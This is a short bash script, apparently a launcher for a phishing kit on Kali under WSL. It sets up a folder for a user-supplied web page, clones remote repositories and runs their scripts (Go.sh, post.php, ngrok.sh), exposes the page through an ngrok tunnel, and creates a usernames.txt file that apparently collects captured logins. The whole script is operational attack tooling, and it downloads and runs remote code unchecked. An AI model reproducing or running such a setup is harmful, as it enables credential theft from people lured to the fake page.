echo
echo
echo "Website Name: "
read -r website
if [ ! -e "$HOME/web" ]; then
cd ~ && mkdir web
else
echo "Fine! web folder existed in kali's files.."
fi
echo
if [ ! -e "/mnt/d/web" ]; then
cd /mnt/d/ && mkdir web
else
echo "Fine! web folder existed in D drive"
fi
if [ -e "/mnt/d/web/$website" ]; then 
echo "Fine! $website folder existed"
else
cd /mnt/d/web && mkdir "$website"
fi
echo "      Put your index.html inside web/$website folder" 
echo " Press Y if already inserted else press N"
read -p $"  Yes / No:  " option
if [[ $option == "Y" || $option == "y" ]]; then
cd /mnt/d/web/$website
git clone https://github.com/NganDii/webmakerfiles
cd webmakerfiles
cp Go.sh post.php /mnt/d/web/$website
cd ..
rm -rf webmakerfiles
cat <<EOF>run.sh
cd $HOME/web/$website && bash Go.sh
EOF
cd /mnt/d/web/
cp -r $website ~/web
cd ~
else
echo "Add files in /web/$website and come back again"
exit 1
fi
if [ ! -e "$HOME/ngrok" ]; then
git clone https://github.com/NganDii/remngrok
cd remngrok && bash ngrok.sh
fi
cd ~
cp -R ngrok web/$website
cd web/$website
chmod +x * 
if [ ! -e ~/web/$website/usernames.txt/ ]; then
cd ~/web/$website
cat <<EOF> usernames.txt
EOF
fi
bash run.sh
echo ""
